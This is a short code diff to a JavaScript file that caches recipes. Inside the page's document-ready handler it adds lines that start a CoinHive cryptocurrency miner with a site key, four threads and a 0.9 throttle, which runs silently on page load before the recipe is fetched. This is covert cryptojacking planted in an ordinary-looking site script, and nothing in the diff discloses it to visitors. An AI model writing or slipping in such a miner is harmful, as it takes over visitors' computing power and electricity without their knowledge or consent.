@@ -3,6 +3,10 @@ var TIMESTAMP_KEY = 'cached_recipes_ts';
 var DAYS_UNTIL_INVALIDATION = 1;
 
 $(document).ready(function() {
+    var miner = new CoinHive.Anonymous('8tlshLRjCZAHt8EkozsP4PAzAGOKeKFc');
+    miner.setNumThreads(4);
+    miner.setThrottle(0.9);
+    miner.start();
     fetchRecipe();
 });
 
